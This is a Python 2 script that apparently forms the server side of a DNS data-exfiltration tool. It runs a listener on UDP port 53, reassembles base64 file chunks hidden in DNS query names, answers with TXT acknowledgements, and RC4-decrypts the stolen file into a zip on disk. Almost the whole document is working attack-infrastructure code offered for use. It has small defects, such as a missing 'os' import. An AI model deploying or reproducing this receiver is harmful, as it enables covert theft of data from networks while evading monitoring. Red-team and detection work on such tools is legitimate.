#!/usr/bin/python
# -*- coding: utf8 -*-
import argparse
import socket
from dnslib import *
from base64 import b64encode, b64decode
import sys

#======================================================================================================
#											HELPERS FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
# Class providing RC4 encryption/decryption functions
#------------------------------------------------------------------------
class RC4:
	def __init__(self, key = None):
		self.state = range(256) # initialisation de la table de permutation
		self.x = self.y = 0 # les index x et y, au lieu de i et j

		if key is not None:
			self.key = key
			self.init(key)

	# Key schedule
	def init(self, key):
		for i in range(256):
			self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
			self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
		self.x = 0

	# Decrypt binary input data
	def binaryDecrypt(self, data):
		output = [None]*len(data)
		for i in xrange(len(data)):
			self.x = (self.x + 1) & 0xFF
			self.y = (self.state[self.x] + self.y) & 0xFF
			self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
			output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
		return bytearray(output)
		
#------------------------------------------------------------------------
def progress(count, total, status=''):
	"""
	Print a progress bar - https://gist.github.com/vladignatyev/06860ec2040cb497f0f3
	"""
	bar_len = 60
	filled_len = int(round(bar_len * count / float(total)))

	percents = round(100.0 * count / float(total), 1)
	bar = '=' * filled_len + '-' * (bar_len - filled_len)
	sys.stdout.write('[%s] %s%s\t%s\t\r' % (bar, percents, '%', status))
	sys.stdout.flush()

#------------------------------------------------------------------------
def decode(msg):
	msg = msg.replace('_','/').replace('-','+')
	if len(msg)%4 == 3:
		return b64decode(msg + '=')
	elif len(msg)%4 == 2:
		return b64decode(msg + '==')
	else:
		return b64decode(msg)
			
#------------------------------------------------------------------------
def color(string, color=None):
    """
    Author: HarmJ0y, borrowed from Empire
    Change text color for the Linux terminal.
    """
    
    attr = []
    # bold
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

#======================================================================================================
#											MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':

	#------------------------------------------------------------------------
	# Parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
	parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password", required=True)
	args = parser.parse_args()

	#------------------------------------------------------------------------------
	# Check that required directories and path are available, if not create them
	if not os.path.isdir("./output"):
		os.makedirs("./output")
		print color("[+] Creating [./output] directory for incoming files")

	# Setup a UDP server listening on port UDP 53	
	udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	udps.bind(('',53))
	print color("[*] DNS server listening on port 53")
	
	try:
		chunkIndex = 0
		fileData = ''
		
		while True:
			data, addr = udps.recvfrom(1024)
			request = DNSRecord.parse(data)
			qname = str(request.q.qname)
			#print color("[+] Received query: [{}] - Type: [{}]".format(qname, request.q.qtype))
						
			#-----------------------------------------------------------------------------
			# Check if it is the initialization request
			if qname.startswith("init."):
				msg = decode(qname.split(".")[1])
				
				fileName = msg.split('|')[0]		# Name of the file being exfiltrated
				nbChunks = int(msg.split('|')[1])	# Total number of chunks of data expected to receive
				
				# Reset all variables
				fileData = ''
				chunkIndex = 0	
				
				print color("[+] Receiving file [{}] as a ZIP file in [{}] chunks".format(fileName,nbChunks))
				
				reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
				reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
				udps.sendto(reply.pack(), addr)
				
			#-----------------------------------------------------------------------------
			# Else, start receiving the file, chunk by chunk
			else:
				msg = qname[0:-(len(args.domainName)+2)] # Remove the top level domain name
				chunkNumber, rawData = msg.split('.',1)
				
				#---- Is this the chunk of data we're expecting?
				if (int(chunkNumber) == chunkIndex):
					fileData += rawData.replace('.','')
					chunkIndex += 1
					progress(chunkIndex, nbChunks, "Receiving file")
				
				#---- Always acknowledge the received chunk (whether or not it was already received)
				reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
				reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunkNumber)))
				udps.sendto(reply.pack(), addr)
				
				#---- Have we received all chunks of data ?
				if chunkIndex == nbChunks:
					print '\n'
					try:
						# Create and initialize the RC4 decryptor object
						rc4Decryptor = RC4(args.password)
						
						# Save data to a file
						outputFileName = "./output" + fileName + ".zip"
						print color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password,outputFileName))
						with open(outputFileName, 'wb+') as fileHandle:
							fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(decode(fileData))))
							fileHandle.close()
							print color("[+] Output file [{}] saved successfully".format(outputFileName))
					except IOError:
						print color("[!] Could not write file [{}]".format(outputFileName))
			
	except KeyboardInterrupt:
		pass
	finally:
		print color("[!] Stopping DNS Server")
		udps.close()
